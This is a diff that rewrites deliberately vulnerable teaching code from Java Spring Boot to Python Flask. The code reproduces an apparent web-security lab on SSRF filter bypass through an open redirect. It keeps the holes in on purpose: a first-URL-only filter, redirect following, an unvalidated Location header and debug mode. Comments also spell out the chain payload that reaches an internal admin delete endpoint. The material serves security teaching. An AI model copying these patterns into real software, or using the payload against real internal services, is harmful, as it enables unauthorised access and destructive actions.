@@ -1,123 +1,122 @@
-/**
- * VULNERABLE CODE — SSRF with Filter Bypass via Open Redirection
- * Language: Java (Spring Boot)
- *
- * BUG 1 — SSRF in StockController:
- *   Filter allows local paths only.
- *   RestTemplate follows redirects by default.
- *   Open redirect on a local path bypasses the filter.
- *
- * BUG 2 — Open Redirect in ProductController:
- *   path parameter written directly into ResponseEntity Location header.
- *   No validation. Redirects to any URL.
- */
+"""
+VULNERABLE CODE — SSRF with Filter Bypass via Open Redirection
+Language: Python (Flask)
 
-import org.springframework.http.*;
-import org.springframework.web.bind.annotation.*;
-import org.springframework.web.client.RestTemplate;
+TWO VULNERABILITIES:
 
-import java.net.URI;
+  BUG 1 — SSRF in /product/stock
+    The stockApi parameter is fetched server-side.
+    Filter allows only local paths or the app's own domain.
+    BUT: redirect following is enabled, so the filter is bypassed
+    via an open redirect on the allowed domain.
 
+  BUG 2 — Open Redirect in /product/nextProduct
+    The `path` parameter is written directly into the Location header
+    with no validation. Redirects to any URL the attacker supplies.
 
-// ── BUG 1: SSRF Stock Checker ─────────────────────────────────────────────────
+CHAIN:
+    stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
+    → filter passes (local path)
+    → server follows 302 to http://192.168.0.12:8080/admin
+    → internal admin returned
+"""
 
-@RestController
-public class StockController {
+from flask import Flask, request, jsonify, redirect, abort
+import requests
+from urllib.parse import urlparse
 
-    private static final String APP_DOMAIN = "your-lab-id.web-security-academy.net";
+app = Flask(__name__)
 
-    // Default RestTemplate follows redirects — this is the vulnerability
-    private final RestTemplate restTemplate = new RestTemplate();
-
-
-    /**
-     * Filter: allows local paths and own domain.
-     * FLAW: does not validate redirect destinations.
-     */
-    private boolean isAllowedUrl(String url) {
-        // Allow relative/local paths
-        if (url.startsWith("/")) {
-            return true;
-        }
-
-        // Allow requests to own domain
-        try {
-            URI uri = new URI(url);
-            return APP_DOMAIN.equals(uri.getHost());
-        } catch (Exception e) {
-            return false;
-        }
-    }
+APP_DOMAIN = "your-lab-id.web-security-academy.net"
 
 
-    @PostMapping("/product/stock")
-    public ResponseEntity<String> checkStock(
-            @RequestParam("stockApi") String stockApiUrl) {
+# ── BUG 1: SSRF with local-only filter but redirect following enabled ─────────
 
-        if (stockApiUrl == null || stockApiUrl.isEmpty()) {
-            return ResponseEntity.badRequest().body("stockApi required");
-        }
+def is_allowed_url(url: str) -> bool:
+    """
+    Filter: only allow local paths or this app's own domain.
+    FLAW: Does not validate redirect destinations.
+    FLAW: HTTP client follows redirects after this check passes.
+    """
+    # Allow relative/local paths
+    if url.startswith("/"):
+        return True
 
-        // ❌ BUG 1a: filter only checks the first URL, not redirect targets
-        if (!isAllowedUrl(stockApiUrl)) {
-            return ResponseEntity
-                .status(HttpStatus.BAD_REQUEST)
-                .body("External stock check blocked for security reasons");
-        }
+    # Allow requests to the app's own domain
+    try:
+        parsed = urlparse(url)
+        if parsed.hostname == APP_DOMAIN:
+            return True
+    except Exception:
+        pass
 
-        // Prepend domain for relative paths
-        if (stockApiUrl.startsWith("/")) {
-            stockApiUrl = "https://" + APP_DOMAIN + stockApiUrl;
-        }
-
-        // ❌ BUG 1b: RestTemplate follows redirects by default
-        // When stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
-        // RestTemplate follows the 302 → fetches the internal admin panel
-        String response = restTemplate.getForObject(stockApiUrl, String.class);
-        return ResponseEntity.ok(response);
-    }
-}
+    return False
 
 
-// ── BUG 2: Open Redirect ──────────────────────────────────────────────────────
+@app.route("/product/stock", methods=["POST"])
+def check_stock():
+    stock_api_url = request.form.get("stockApi")
 
-@RestController
-public class ProductController {
+    if not stock_api_url:
+        abort(400, "stockApi required")
 
-    @GetMapping("/product/nextProduct")
-    public ResponseEntity<Void> nextProduct(@RequestParam String path) {
+    # ❌ BUG 1a: Filter checks ONLY the initial URL
+    if not is_allowed_url(stock_api_url):
+        abort(400, "External stock check blocked for security reasons")
 
-        // ❌ BUG 2: path is written directly into Location header
-        // Intended: path = "/product?productId=3"
-        // Attacker: path = "http://192.168.0.12:8080/admin"
-        return ResponseEntity
-            .status(HttpStatus.FOUND)
-            .location(URI.create(path))  // ← no validation on 'path'
-            .build();
-    }
-}
+    # Handle relative URLs — prepend the base
+    if stock_api_url.startswith("/"):
+        stock_api_url = f"https://{APP_DOMAIN}{stock_api_url}"
+
+    # ❌ BUG 1b: allow_redirects=True (default) — follows 302 to internal target
+    # This means: even if the first URL passes the filter,
+    # a redirect to http://192.168.0.12:8080/admin will be followed
+    response = requests.get(
+        stock_api_url,
+        allow_redirects=True,   # ← THE VULNERABILITY: should be False
+    )
+
+    return jsonify({"stock": response.text}), response.status_code
 
 
-/*
- * ============================================================
- * ATTACK TRACE:
- *
- * POST /product/stock
- * stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
- *
- * isAllowedUrl():
- *   url.startsWith("/") → true → PASSES
- *
- * Full URL: https://app.domain/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
- *
- * RestTemplate.getForObject() fetches it:
- *   GET /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
- *   → 302 Location: http://192.168.0.12:8080/admin/delete?username=carlos
- *
- * RestTemplate follows redirect (default):
- *   GET /admin/delete?username=carlos on 192.168.0.12:8080
- *   → carlos deleted → 302
- *
- * Filter satisfied by first URL. Redirect did the rest.
- * ============================================================
- */
+# ── BUG 2: Open Redirect in nextProduct ──────────────────────────────────────
+
+@app.route("/product/nextProduct")
+def next_product():
+    # ❌ BUG 2: path parameter written directly into Location header
+    # No validation — redirects to ANY URL the attacker supplies
+    path = request.args.get("path", "/")
+
+    # Intended use: path = "/product?productId=2"
+    # Attacker use: path = "http://192.168.0.12:8080/admin"
+    return redirect(path)   # ← no validation on 'path'
+
+
+# ============================================================
+# ATTACK TRACE — what happens during exploitation:
+#
+# Attacker sends:
+#   POST /product/stock
+#   stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+#
+# is_allowed_url() checks:
+#   url.startswith("/") → True → PASSES
+#
+# Full URL constructed:
+#   https://app.domain/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+#
+# requests.get() fetches it:
+#   GET /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+#   Response: 302 Location: http://192.168.0.12:8080/admin/delete?username=carlos
+#
+# allow_redirects=True → follows the 302:
+#   GET /admin/delete?username=carlos
+#   Host: 192.168.0.12:8080
+#   Response: 302 (carlos deleted)
+#
+# Filter was bypassed. Internal action executed.
+# ============================================================
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
